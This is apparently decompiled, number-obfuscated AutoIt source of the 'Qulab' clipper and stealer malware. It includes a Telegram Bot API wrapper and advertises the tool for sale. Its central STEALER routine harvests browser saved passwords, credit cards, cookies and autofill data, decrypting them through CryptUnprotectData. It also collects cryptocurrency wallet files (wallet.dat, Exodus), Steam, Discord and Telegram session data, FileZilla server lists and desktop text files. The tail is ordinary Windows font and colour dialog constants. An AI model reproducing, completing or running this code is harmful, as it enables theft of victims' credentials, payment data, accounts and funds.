43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_STOPMESSAGELIVELOCATION($CHATID,$REPLYMARKUP=41)
$QUERY=$URL&"/stopMessageLiveLocation?chat_id="&$CHATID
4$REPLYMARKUP<>415$QUERY&="&reply_markup="&$REPLYMARKUP
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_GETUSERPROFILEPHOTOS($CHATID,$OFFSET="",$LIMIT="")
$QUERY=$URL&"/getUserProfilePhotos?user_id="&$CHATID
4$OFFSET<>""5$QUERY&="&offset="&$OFFSET
4$LIMIT<>""5$QUERY&="&limit="&$LIMIT
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
28$COUNT=JSON_GET($JSON,"[result][total_count]")
28$PHOTOARRAY[$COUNT+1]
$PHOTOARRAY[0]=$COUNT
13$I=115$COUNT
$PHOTOARRAY[$I]=JSON_GET($JSON,"[result][photos]["&$I-1&"][2][file_id]")
14
34$PHOTOARRAY
33
32_KICKCHATMEMBER($CHATID,$USERID,$UNTILDATE="")
$QUERY=$URL&"/kickChatMember?chat_id="&$CHATID&"&user_id="&$USERID
4$UNTILDATE<>""5$QUERY&="&until_date="&$UNTILDATE
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_UNBANCHATMEMBER($CHATID,$USERID)
$QUERY=$URL&"/unbanChatMember?chat_id="&$CHATID&"&user_id="&$USERID
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_EXPORTCHATINVITELINK($CHATID)
$QUERY=$URL&"/exportChatInviteLink?chat_id="&$CHATID
28$JSON=JSON_DECODE(__HTTPGET($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
34JSON_GET($JSON,"[result]")
33
32_SETCHATPHOTO($CHATID,$PATH)
28$QUERY=$URL&"/setChatPhoto"
28$HOPEN=_WINHTTPOPEN("",$WINHTTP_ACCESS_TYPE_NAMED_PROXY,$SPROXY)
28$FORM='<form action="'&$QUERY&'" method="post" enctype="multipart/form-data">'&'<input type="text" name="chat_id"/>'&'<input type="file" name="photo"/>'&"</form>"
28$RESPONSE=_WINHTTPSIMPLEFORMFILL($FORM,$HOPEN,41,"name:chat_id",$CHATID,"name:photo",$PATH)
_WINHTTPCLOSEHANDLE($HOPEN)
28$JSON=JSON_DECODE($RESPONSE)
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_DELETECHATPHOTO($CHATID)
$QUERY=$URL&"/deleteChatPhoto?chat_id="&$CHATID
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_SETCHATTITLE($CHATID,$TITLE)
$QUERY=$URL&"/setChatTitle?chat_id="&$CHATID&"&title="&$TITLE
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_SETCHATDESCRIPTION($CHATID,$DESCRIPTION)
$QUERY=$URL&"/setChatDescription?chat_id="&$CHATID&"&description="&$DESCRIPTION
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_PINCHATMESSAGE($CHATID,$MSGID,$DISABLENOTIFICATION=40)
$QUERY=$URL&"/pinChatMessage?chat_id="&$CHATID&"&message_id="&$MSGID
4$DISABLENOTIFICATION5$QUERY&="&disable_notification=true"
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_UNPINCHATMESSAGE($CHATID)
$QUERY=$URL&"/unpinChatMessage?chat_id="&$CHATID
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_LEAVECHAT($CHATID)
$QUERY=$URL&"/leaveChat?chat_id="&$CHATID
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_GETCHAT($CHATID)
28$QUERY=$URL&"/getChat?chat_id="&$CHATID
28$JSON=JSON_DECODE(__HTTPGET($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
28$CHATDATA[4]=[JSON_GET($JSON,"[result][id]"),JSON_GET($JSON,"[result][username]"),JSON_GET($JSON,"[result][first_name]"),JSON_GET($JSON,"[result][photo][big_file_id]")]
34$CHATDATA
33
32_GETCHATADMINISTRATORS($CHATID)
28$QUERY=$URL&"/getChatAdministrators?chat_id="&$CHATID
33(__HTTPGET($QUERY))
33
32_GETCHATMEMBERSCOUNT($CHATID)
28$QUERY=$URL&"/getChatMembersCount?chat_id="&$CHATID
33(__HTTPGET($QUERY))
33
32_GETCHATMEMBER($CHATID)
28$QUERY=$URL&"/getChatMember?chat_id="&$CHATID
33(__HTTPGET($QUERY))
33
32_SETCHATSTICKERSET($CHATID)
28$QUERY=$URL&"/setChatStickerSet?chat_id="&$CHATID
33(__HTTPGET($QUERY))
33
32_DELETECHATSTICKERSET($CHATID)
28$QUERY=$URL&"/deleteChatStickerSet?chat_id="&$CHATID
33(__HTTPGET($QUERY))
33
32__GETFILEID(36$JSON,$TYPE)
4($TYPE="photo")5
4(JSON_GET($JSON,"[result][photo][3][file_id]"))534JSON_GET($JSON,"[result][photo][3][file_id]")
4(JSON_GET($JSON,"[result][photo][2][file_id]"))534JSON_GET($JSON,"[result][photo][2][file_id]")
4(JSON_GET($JSON,"[result][photo][1][file_id]"))534JSON_GET($JSON,"[result][photo][1][file_id]")
4(JSON_GET($JSON,"[result][photo][0][file_id]"))534JSON_GET($JSON,"[result][photo][0][file_id]")
8
4($TYPE="video")534JSON_GET($JSON,"[result][animation][file_id]")
4($TYPE="audio")534JSON_GET($JSON,"[result][audio][file_id]")
4($TYPE="document")534JSON_GET($JSON,"[result][document][file_id]")
4($TYPE="voice")534JSON_GET($JSON,"[result][voice][file_id]")
4($TYPE="sticker")534JSON_GET($JSON,"[result][sticker][file_id]")
4($TYPE="videonote")534JSON_GET($JSON,"[result][document][file_id]")
33
32__GETFILEPATH($FILEID)
28$QUERY=$URL&"/getFile?file_id="&$FILEID
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
34JSON_GET($JSON,"[result][file_path]")
33
32__DOWNLOADFILE($FILEPATH)
28$FIRSTSPLIT=331($FILEPATH,"/")
28$FILENAME=$FIRSTSPLIT[2]
28$QUERY="https://api.telegram.org/file/bot"&$TOKEN&"/"&$FILEPATH
205($QUERY,$FILENAME)
3439
33
32__URLENCODE($STRING)
$STRING=331($STRING,"")
13$I=115$STRING[0]
45($STRING[$I])<4825($STRING[$I])>1225
$STRING[$I]="%"&_STRINGTOHEX($STRING[$I])
8
14
$STRING=_ARRAYTOSTRING($STRING,"",1)
34$STRING
33
32__MSGDECODE($UPDATE)
28$JSON=JSON_DECODE($UPDATE)
4(JSON_GET($JSON,"[result][0][message][chat][type]")="private")5
28$MSGDATA[10]=[JSON_GET($JSON,"[result][0][update_id]"),JSON_GET($JSON,"[result][0][message][message_id]"),JSON_GET($JSON,"[result][0][message][from][id]"),JSON_GET($JSON,"[result][0][message][from][username]"),JSON_GET($JSON,"[result][0][message][from][first_name]")]
4(JSON_GET($JSON,"[result][0][message][text]"))5$MSGDATA[5]=JSON_GET($JSON,"[result][0][message][text]")
34$MSGDATA
7(JSON_GET($JSON,"[result][0][message][chat][type]")="group")2(JSON_GET($JSON,"[result][0][message][chat][type]")="supergroup")5
28$MSGDATA[10]=[JSON_GET($JSON,"[result][0][update_id]"),JSON_GET($JSON,"[result][0][message][message_id]"),JSON_GET($JSON,"[result][0][message][from][id]"),JSON_GET($JSON,"[result][0][message][from][username]"),JSON_GET($JSON,"[result][0][message][from][first_name]"),JSON_GET($JSON,"[result][0][message][chat][id]"),JSON_GET($JSON,"[result][0][message][chat][title]")]
4(JSON_GET($JSON,"[result][0][message][left_chat_member]"))5
$MSGDATA[7]="left"
$MSGDATA[8]=JSON_GET($JSON,"[result][0][message][from][id]")
$MSGDATA[8]=JSON_GET($JSON,"[result][0][message][from][username]")
$MSGDATA[8]=JSON_GET($JSON,"[result][0][message][from][first_name]")
7(JSON_GET($JSON,"[result][0][message][new_chat_member]"))5
$MSGDATA[7]="new"
$MSGDATA[8]=JSON_GET($JSON,"[result][0][message][from][id]")
$MSGDATA[8]=JSON_GET($JSON,"[result][0][message][from][username]")
$MSGDATA[8]=JSON_GET($JSON,"[result][0][message][from][first_name]")
6
$MSGDATA[7]=JSON_GET($JSON,"[result][0][message][text]")
8
34$MSGDATA
7(JSON_GET($JSON,"[result][0][edited_message][chat][type]")="private")5
28$MSGDATA[10]=[JSON_GET($JSON,"[result][0][update_id]"),JSON_GET($JSON,"[result][0][edited_message][message_id]"),JSON_GET($JSON,"[result][0][edited_message][from][id]"),JSON_GET($JSON,"[result][0][edited_message][from][username]"),JSON_GET($JSON,"[result][0][edited_message][from][first_name]")]
4(JSON_GET($JSON,"[result][0][edited_message][text]"))5$MSGDATA[5]=JSON_GET($JSON,"[result][0][edited_message][text]")
34$MSGDATA
7(JSON_GET($JSON,"[result][0][edited_message][chat][type]")="group")5
28$MSGDATA[10]=[JSON_GET($JSON,"[result][0][update_id]"),JSON_GET($JSON,"[result][0][edited_message][message_id]"),JSON_GET($JSON,"[result][0][edited_message][from][id]"),JSON_GET($JSON,"[result][0][edited_message][from][username]"),JSON_GET($JSON,"[result][0][edited_message][from][first_name]")]
4(JSON_GET($JSON,"[result][0][edited_message][text]"))5$MSGDATA[5]=JSON_GET($JSON,"[result][0][edited_message][text]")
34$MSGDATA
7(JSON_GET($JSON,"[result][0][callback_query][id]")<>"")5
28$MSGDATA[10]=[JSON_GET($JSON,"[result][0][update_id]"),JSON_GET($JSON,"[result][0][callback_query][id]"),JSON_GET($JSON,"[result][0][callback_query][from][id]"),JSON_GET($JSON,"[result][0][callback_query][from][username]"),JSON_GET($JSON,"[result][0][callback_query][from][first_name]"),JSON_GET($JSON,"[result][0][callback_query][data]")]
34$MSGDATA
7(JSON_GET($JSON,"[result][0][inline_query][id]")<>"")5
28$MSGDATA[10]=[JSON_GET($JSON,"[result][0][update_id]"),JSON_GET($JSON,"[result][0][inline_query][id]"),JSON_GET($JSON,"[result][0][inline_query][from][id]"),JSON_GET($JSON,"[result][0][inline_query][from][username]"),JSON_GET($JSON,"[result][0][inline_query][from][first_name]"),JSON_GET($JSON,"[result][0][inline_query][query]")]
34$MSGDATA
7(JSON_GET($JSON,"[result][0][channel_post][message_id]")<>"")5
28$MSGDATA[10]=[JSON_GET($JSON,"[result][0][update_id]"),JSON_GET($JSON,"[result][0][channel_post][message_id]"),JSON_GET($JSON,"[result][0][channel_post][chat][id]"),JSON_GET($JSON,"[result][0][channel_post][chat][username]"),JSON_GET($JSON,"[result][0][channel_post][chat][title]")]
4(JSON_GET($JSON,"[result][0][message][text]"))5$MSGDATA[5]=JSON_GET($JSON,"[result][0][message][text]")
34$MSGDATA
7(JSON_GET($JSON,"[result][0][edited_channel_post][chat][type]")="channel")5
28$MSGDATA[10]=[JSON_GET($JSON,"[result][0][update_id]"),JSON_GET($JSON,"[result][0][edited_message][message_id]"),JSON_GET($JSON,"[result][0][edited_message][from][id]"),JSON_GET($JSON,"[result][0][edited_message][from][username]"),JSON_GET($JSON,"[result][0][edited_message][from][first_name]")]
4(JSON_GET($JSON,"[result][0][edited_message][text]"))5$MSGDATA[5]=JSON_GET($JSON,"[result][0][edited_message][text]")
34$MSGDATA
8
33
32__HTTPGET($SURL,$SDATA="")
28$OHTTP=251("WinHttp.WinHttpRequest.5.1")
$OHTTP.Open("GET",$SURL&"?"&$SDATA,40)
4(@ERROR)534287(1,0,0)
4$SPROXY<>""5
$OHTTP.SetProxy(2,$SPROXY)
$OHTTP.SetCredentials($SUSER,$SPASS,1)
8
$OHTTP.Send()
4(@ERROR)534287(2,0,0)
4($OHTTP.Status<>$HTTP_STATUS_OK)534287(3,0,0)
34287(0,0,$OHTTP.ResponseText)
33
32__HTTPPOST($SURL,$SDATA="")
28$OHTTP=251("WinHttp.WinHttpRequest.5.1")
$OHTTP.Open("POST",$SURL,40)
4(@ERROR)534287(1,0,0)
4$SPROXY<>""5
$OHTTP.SetProxy(2,$SPROXY)
$OHTTP.SetCredentials($SUSER,$SPASS,1)
8
$OHTTP.SetRequestHeader("Content-Type","application/x-www-form-urlencoded")
$OHTTP.Send($SDATA)
4(@ERROR)534287(2,0,0)
4($OHTTP.Status<>$HTTP_STATUS_OK)534287(3,0,0)
34287(0,0,$OHTTP.ResponseText)
33
29$STEP,$1,$2,$10,$20,$SPLIT,$SIZER,$STEAMDIR,$TELEG,$STEAM,$TARRAY,$PATH[1][3],$PASSWORDS[1][4],$FORMH[1][2],$FORMHP[1][2],$CREDIT[1][4],$URLS[1][4],$COOKIES[0][2],$SDESC,$SQLRESULT,$SQLROWS,$SQLCOLUMNS,$CUTTER=".Ю\|2СUЕТ1|/Ю.",$LOGO="# /===============================\"&@CRLF&"# |=== QULAB CLIPPER + STEALER ===|"&@CRLF&"# |===============================|"&@CRLF&"# |==== BUY CLIPPER + STEALER ====|"&@CRLF&"# |=== http://teleg.run/QulabZ ===|"&@CRLF&"# \===============================/"&@CRLF&@CRLF
32STEALER()
_FINDFILES(@DESKTOPDIR,"*.txt")
_FINDFILES(@APPDATADIR,"wallet.dat")
_FINDFILES(@LOCALAPPDATADIR,"wallet.dat")
_FINDFILES(@DESKTOPDIR,"wallet.dat")
_FINDFILES(@APPDATADIR,"formhistory.sqlite")
_FINDFILES(@LOCALAPPDATADIR,"formhistory.sqlite")
_FINDFILES(@APPDATADIR,"Login Data")
_FINDFILES(@LOCALAPPDATADIR,"Login Data")
_FINDFILES(@APPDATADIR,"Web Data")
_FINDFILES(@LOCALAPPDATADIR,"Web Data")
_FINDFILES(@APPDATADIR,"cookies.sqlite")
_FINDFILES(@LOCALAPPDATADIR,"cookies.sqlite")
_FINDFILES(@APPDATADIR,"Cookies")
_FINDFILES(@LOCALAPPDATADIR,"Cookies")
EMPTYWORKINGSET()
$STEAMDIR=328(278("HKEY_CURRENT_USER\Software\Valve\Steam","SteamPath"),"/","\")
4$STEAMDIR<>""5
$PATH[0][0]+=1
_ARRAYADD($PATH,$STEAMDIR&"\config"&"|config|Steam")
$STEAM=_FILELISTTOARRAY($STEAMDIR,"ssfn*",1)
4$STEAM<>05
13$I=115$STEAM[0]
$PATH[0][0]+=1
_ARRAYADD($PATH,$STEAMDIR&"\"&$STEAM[$I]&"|"&$STEAM[$I]&"|Steam")
14
8
8
455(@APPDATADIR&"\discord\Local Storage")>61445
$PATH[0][0]+=1
_ARRAYADD($PATH,@APPDATADIR&"\discord\Local Storage"&"|Local Storage|Discord")
8
$TELEG=278("HKEY_CLASSES_ROOT\tdesktop.tg\DefaultIcon","")
4$TELEG<>""5
$TELEG=326($TELEG,'"(.*\\)',3)[0]&"tdata"
$TARRAY=_FILELISTTOARRAY($TELEG)
4$TARRAY<>05
13$I=115$TARRAY[0]
4326($TARRAY[$I],"^[A-Z0-9]{17}$")1105($TELEG&"\"&$TARRAY[$I])<=10245
$PATH[0][0]+=1
_ARRAYADD($PATH,$TELEG&"\"&$TARRAY[$I]&"|"&$TARRAY[$I]&"|Telegram")
7326($TARRAY[$I],"^[A-Z0-9]{16}$")155($TELEG&"\"&$TARRAY[$I])>-15
$PATH[0][0]+=1
_ARRAYADD($PATH,$TELEG&"\"&$TARRAY[$I]&"|"&$TARRAY[$I]&":D"&"|Telegram")
8
14
8
8
$SIZER=55(@APPDATADIR&"\Exodus\exodus.wallet")
4$SIZER>=300001$SIZER<=30000005
$PATH[0][0]+=1
_ARRAYADD($PATH,@APPDATADIR&"\Exodus\exodus.wallet|Exodus|Wallets")
8
$REGS=_FINDREGISTER("HKEY_CURRENT_USER\Software","$keys-Qt","strDataDir")
13$I=115$REGS[0][0]
$REGS[$I][0]=328($REGS[$I][0],"/","\")
4105($REGS[$I][0]&"\wallet.dat")>1005
$PATH[0][0]+=1
_ARRAYADD($PATH,$REGS[$I][0]&"\wallet.dat|"&$REGS[$I][1]&".dat|Wallets")
7105($REGS[$I][0]&"\wallets\wallet.dat")>1005
$PATH[0][0]+=1
_ARRAYADD($PATH,$REGS[$I][0]&"\wallets\wallet.dat|"&$REGS[$I][1]&".dat|Wallets")
8
14
$SIZER=105(@APPDATADIR&"\FileZilla\recentservers.xml")
4$SIZER>901$SIZER<100005
$PATH[0][0]+=1
_ARRAYADD($PATH,@APPDATADIR&"\FileZilla\recentservers.xml|recentservers.xml|FileZilla")
8
SQLITESRC($DIR&"\"&$MODULE)
_SQLITE_STARTUP($MODULE)
13$I=115$PATH[0][0]
4$PATH[$I][2]="Auto Fill"5
_SQLITE_OPEN($PATH[$I][0])
4GETTABLE("SELECT fieldname, value FROM moz_formhistory;",$PATH[$I][0],$DIR&"\"&$PATH[$I][2]&$I&".db")=1519
13$F=115369($SQLRESULT)-1
4326($SQLRESULT[$F][0],"(?i)(identifier|login|user|name|mail|nick)")5
$FORMH[0][0]+=1
_ARRAYADD($FORMH,$SQLRESULT[$F][1]&$CUTTER&$PATH[$I][0],0,$CUTTER)
7326($SQLRESULT[$F][0],"(?i)(pass)")5
$FORMHP[0][0]+=1
_ARRAYADD($FORMHP,$SQLRESULT[$F][1]&$CUTTER&$PATH[$I][0],0,$CUTTER)
8
14
ENDTABLE()
7$PATH[$I][2]="Web Data"5
_SQLITE_OPEN($PATH[$I][0])
4GETTABLE("SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards;",$PATH[$I][0],$DIR&"\"&$PATH[$I][2]&$I&".db")=1519
13$F=115369($SQLRESULT)-1
$CREDIT[0][0]+=1
_ARRAYADD($CREDIT,_CRYPTUNPROTECTDATA($SQLRESULT[$F][0],$SDESC)&$CUTTER&$SQLRESULT[$F][1]&$CUTTER&$SQLRESULT[$F][2]&"/"&$SQLRESULT[$F][3]&$CUTTER&$PATH[$I][0],0,$CUTTER)
14
4GETTABLE("SELECT name, value FROM autofill;",$PATH[$I][0],$DIR&"\"&$PATH[$I][2]&$I&".db")=1519
13$F=115369($SQLRESULT)-1
4326($SQLRESULT[$F][0],"(?i)(identifier|login|user|name|mail|nick)")5
$FORMH[0][0]+=1
_ARRAYADD($FORMH,$SQLRESULT[$F][1]&$CUTTER&$PATH[$I][0],0,$CUTTER)
7326($SQLRESULT[$F][0],"(?i)(pass)")5
$FORMHP[0][0]+=1
_ARRAYADD($FORMHP,$SQLRESULT[$F][1]&$CUTTER&$PATH[$I][0],0,$CUTTER)
8
14
ENDTABLE()
7$PATH[$I][2]="Login Data"5
_SQLITE_OPEN($PATH[$I][0])
4GETTABLE("SELECT username_value, password_value, origin_url, action_url FROM logins;",$PATH[$I][0],$DIR&"\"&$PATH[$I][2]&$I&".db")=1519
13$F=115369($SQLRESULT)-1
$PASSWORDS[0][0]+=1
_ARRAYADD($PASSWORDS,$SQLRESULT[$F][0]&$CUTTER&_CRYPTUNPROTECTDATA($SQLRESULT[$F][1],$SDESC)&$CUTTER&$PATH[$I][0]&$CUTTER&$SQLRESULT[$F][2]&" ("&$SQLRESULT[$F][3]&")",0,$CUTTER)
14
ENDTABLE()
7$PATH[$I][2]="Cookies"5
_SQLITE_OPEN($PATH[$I][0])
4$PATH[$I][1]="cookies.sqlite"5
4GETTABLE("select host, 'FALSE' as flag, path, case when isSecure = 1 then 'TRUE' else 'FALSE' end as secure, expiry, name, value from moz_cookies;",$PATH[$I][0],$DIR&"\"&$PATH[$I][2]&$I&".db")=1519
13$F=115369($SQLRESULT)-1
4322($SQLRESULT[$F][0],1)="."5$SQLRESULT[$F][1]="TRUE"
_ARRAYADD($COOKIES,$SQLRESULT[$F][0]&"	"&$SQLRESULT[$F][1]&"	"&$SQLRESULT[$F][2]&"	"&$SQLRESULT[$F][3]&"	"&$SQLRESULT[$F][4]&"	"&$SQLRESULT[$F][5]&"	"&$SQLRESULT[$F][6]&$CUTTER&$PATH[$I][0],0,$CUTTER)
14
ENDTABLE()
6
4GETTABLE("select host_key, 'FALSE' as flag, path, case when is_secure = 1 then 'TRUE' else 'FALSE' end as secure, expires_utc, name, encrypted_value from cookies;",$PATH[$I][0],$DIR&"\"&$PATH[$I][2]&$I&".db")=1519
13$F=115369($SQLRESULT)-1
4322($SQLRESULT[$F][0],1)="."5$SQLRESULT[$F][1]="TRUE"
_ARRAYADD($COOKIES,$SQLRESULT[$F][0]&"	"&$SQLRESULT[$F][1]&"	"&$SQLRESULT[$F][2]&"	"&$SQLRESULT[$F][3]&"	"&GENC($SQLRESULT[$F][4])&"	"&$SQLRESULT[$F][5]&"	"&_CRYPTUNPROTECTDATA($SQLRESULT[$F][6],$SDESC)&$CUTTER&$PATH[$I][0],0,$CUTTER)
14
ENDTABLE()
8
8
14
_SQLITE_SHUTDOWN()
94($DIR&"\"&$MODULE)
$FORMH=_ARRAYDELETEDUBLICATE($FORMH)
$FORMHP=_ARRAYDELETEDUBLICATE($FORMHP)
$PATH=_ARRAYDELETEDUBLICATE($PATH)
33
32_ARRAYDELETEDUBLICATE($ARRAY,$COL=0)
28$SSTR="|"
13$I=369($ARRAY)-115016-1
4311($SSTR,"|"&$ARRAY[$I][$COL]&"|")5
$ARRAY[0][0]-=1
_ARRAYDELETE($ARRAY,$I)
6
$SSTR&=$ARRAY[$I][$COL]&"|"
8
14
34$ARRAY
33
32_FINDREGISTER($SROOT,$SPODFOLDER,$SKEY)
28$KEYS[1],$KEY[1][2]
$KEYS[0]="0"
4323($SPODFOLDER)<>01322($SPODFOLDER,1)<>"\"5$SPODFOLDER="\"&$SPODFOLDER
9$KEYS[$KEYS[0]]<>""
$KEYS[0]+=1
_ARRAYADD($KEYS,276($SROOT,$KEYS[0]))
10
$KEYS[0]=$KEYS[0]-1
13$I=115$KEYS[0]
$PODFOLDER=328($SPODFOLDER,"$keys",$KEYS[$I])
$REG=278($SROOT&"\"&$KEYS[$I]&$PODFOLDER,$SKEY)
4$REG<>""5
$KEY[0][0]+=1
_ARRAYADD($KEY,$REG&"|"&$KEYS[$I])
8
14
34$KEY
33
32_FINDFILES($SROOT,$SFILE)
28$FILELIST,$SZDRIVE,$SZDIR,$SZFNAME,$SZEXT
$FILELIST=_FILELISTTOARRAY($SROOT,$SFILE,1)
43@ERROR5
13$I=115$FILELIST[0]
4$SFILE="wallet.dat"5
$PATH[0][0]+=1
_ARRAYADD($PATH,$SROOT&"\"&$FILELIST[$I]&"|UnknownWallet "&$I&".dat|Wallets")
7$SFILE="Login Data"5
$PATH[0][0]+=1
_ARRAYADD($PATH,$SROOT&"\"&$FILELIST[$I]&"|"&$FILELIST[$I]&"|Login Data")
7$SFILE="formhistory.sqlite"5
$PATH[0][0]+=1
_ARRAYADD($PATH,$SROOT&"\"&$FILELIST[$I]&"|"&$FILELIST[$I]&"|Auto Fill")
7$SFILE="Web Data"5
$PATH[0][0]+=1
_ARRAYADD($PATH,$SROOT&"\"&$FILELIST[$I]&"|"&$FILELIST[$I]&"|Web Data")
7$SFILE="cookies.sqlite"2$SFILE="Cookies"5
$PATH[0][0]+=1
_ARRAYADD($PATH,$SROOT&"\"&$FILELIST[$I]&"|"&$FILELIST[$I]&"|Cookies")
6
$PATH[0][0]+=1
_ARRAYADD($PATH,$SROOT&"\"&$FILELIST[$I]&"|"&$FILELIST[$I]&"|Desktop TXT Files")
8
14
8
$FILELIST=_FILELISTTOARRAY($SROOT,"*",2)
43@ERROR5
13$I=115$FILELIST[0]
_FINDFILES($SROOT&"\"&$FILELIST[$I],$SFILE)
$STEP+=1
14
8
33
32GETTABLE($ALG,$PATHSTART,$PATHEND)
28$GET=_SQLITE_GETTABLE2D(-1,$ALG,$SQLRESULT,$SQLROWS,$SQLCOLUMNS)
4$GET<>05
4$GET=55
ENDTABLE()
91($PATHSTART,$PATHEND,9)
_SQLITE_OPEN($PATHEND)
_SQLITE_GETTABLE2D(-1,$ALG,$SQLRESULT,$SQLROWS,$SQLCOLUMNS)
4@ERROR5
ENDTABLE()
341
8
6
ENDTABLE()
341
8
8
33
32ENDTABLE()
_SQLITE_CLOSE()
EMPTYWORKINGSET()
33
32GENC($VAL)
34280($VAL/1000000-116444736)
33
32MOVEANDINSTRUCT($PATH1,$PATH2,$PATH3,$MODE,$INSTR)
4$MODE=15
453($PATH1,$PATH2,1)1395($PATH3)5123($PATH3,$LOGO&$INSTR)
6
491($PATH1,$PATH2,9)1395($PATH3)5123($PATH3,$LOGO&$INSTR)
8
33
2930$FW_DONTCARE=0
2930$FW_THIN=100
2930$FW_EXTRALIGHT=200
2930$FW_ULTRALIGHT=200
2930$FW_LIGHT=300
2930$FW_NORMAL=400
2930$FW_REGULAR=400
2930$FW_MEDIUM=500
2930$FW_SEMIBOLD=600
2930$FW_DEMIBOLD=600
2930$FW_BOLD=700
2930$FW_EXTRABOLD=800
2930$FW_ULTRABOLD=800
2930$FW_HEAVY=900
2930$FW_BLACK=900
2930$CF_EFFECTS=256
2930$CF_PRINTERFONTS=2
2930$CF_SCREENFONTS=1
2930$CF_NOSCRIPTSEL=8388608
2930$CF_INITTOLOGFONTSTRUCT=64
2930$LOGPIXELSX=88
2930$LOGPIXELSY=90
2930$ANSI_CHARSET=0
2930$ARABIC_CHARSET=178
2930$BALTIC_CHARSET=186
2930$CHINESEBIG5_CHARSET=136
2930$DEFAULT_CHARSET=1
2930$EASTEUROPE_CHARSET=238
2930$GB2312_CHARSET=134
2930$GREEK_CHARSET=161
2930$HANGEUL_CHARSET=129
2930$HEBREW_CHARSET=177
2930$JOHAB_CHARSET=130
2930$MAC_CHARSET=77
2930$OEM_CHARSET=255
2930$RUSSIAN_CHARSET=204
2930$SHIFTJIS_CHARSET=128
2930$SYMBOL_CHARSET=2
2930$THAI_CHARSET=222
2930$TURKISH_CHARSET=162
2930$VIETNAMESE_CHARSET=163
2930$OUT_CHARACTER_PRECIS=2
2930$OUT_DEFAULT_PRECIS=0
2930$OUT_DEVICE_PRECIS=5
2930$OUT_OUTLINE_PRECIS=8
2930$OUT_PS_ONLY_PRECIS=10
2930$OUT_RASTER_PRECIS=6
2930$OUT_STRING_PRECIS=1
2930$OUT_STROKE_PRECIS=3
2930$OUT_TT_ONLY_PRECIS=7
2930$OUT_TT_PRECIS=4
2930$CLIP_CHARACTER_PRECIS=1
2930$CLIP_DEFAULT_PRECIS=0
2930$CLIP_DFA_DISABLE=48
2930$CLIP_EMBEDDED=128
2930$CLIP_LH_ANGLES=16
2930$CLIP_MASK=15
2930$CLIP_DFA_OVERRIDE=64
2930$CLIP_STROKE_PRECIS=2
2930$CLIP_TT_ALWAYS=32
2930$ANTIALIASED_QUALITY=4
2930$DEFAULT_QUALITY=0
2930$DRAFT_QUALITY=1
2930$NONANTIALIASED_QUALITY=3
2930$PROOF_QUALITY=2
2930$CLEARTYPE_QUALITY=5
2930$DEFAULT_PITCH=0
2930$FIXED_PITCH=1
2930$VARIABLE_PITCH=2
2930$FF_DECORATIVE=80
2930$FF_DONTCARE=0
2930$FF_MODERN=48
2930$FF_ROMAN=16
2930$FF_SCRIPT=64
2930$FF_SWISS=32
2930$FS_REGULAR=0
2930$FS_BOLD=1
2930$FS_ITALIC=2
2930$__MISCCONSTANT_CC_ANYCOLOR=256
2930$__MISCCONSTANT_CC_FULLOPEN=2
2930$__MISCCONSTANT_CC_RGBINIT=1
2930$TAGCHOOSECOLOR="dword Size;hwnd hWndOwnder;handle hInstance;dword rgbResult;ptr CustColors;dword Flags;lparam lCustData;"&"ptr lpfnHook;ptr lpTemplateName"
2930$TAGCHOOSEFONT="dword Size;hwnd hWndOwner;handle hDC;ptr LogFont;int PointSize;dword Flags;dword rgbColors;lparam CustData;"&"ptr fnHook;ptr TemplateName;handle hInstance;ptr szStyle;word FontType;int SizeMin;int SizeMax"
32_CHOOSECOLOR($IRETURNTYPE=0,$ICOLORREF=0,$IREFTYPE=0,$HWNDOWNDER=0)
28$TAGCUSTCOLORS="dword[16]"
28$TCHOOSE=65($TAGCHOOSECOLOR)
28$TCC=65($TAGCUSTCOLORS)
4$IREFTYPE=15
$ICOLORREF=217($ICOLORREF)
7$IREFTYPE=25
$ICOLORREF=199(306($ICOLORREF),6)
$ICOLORREF="0x"&325($ICOLORREF,5,2)&325($ICOLORREF,3,2)&325($ICOLORREF,1,2)
8
69($TCHOOSE,"Size",68($TCHOOSE))
69($TCHOOSE,"hWndOwnder",$HWNDOWNDER)
69($TCHOOSE,"rgbResult",$ICOLORREF)
69($TCHOOSE,"CustColors",67($TCC))
69($TCHOOSE,"Flags",19($__MISCCONSTANT_CC_ANYCOLOR,$__MISCCONSTANT_CC_FULLOPEN,$__MISCCONSTANT_CC_RGBINIT))
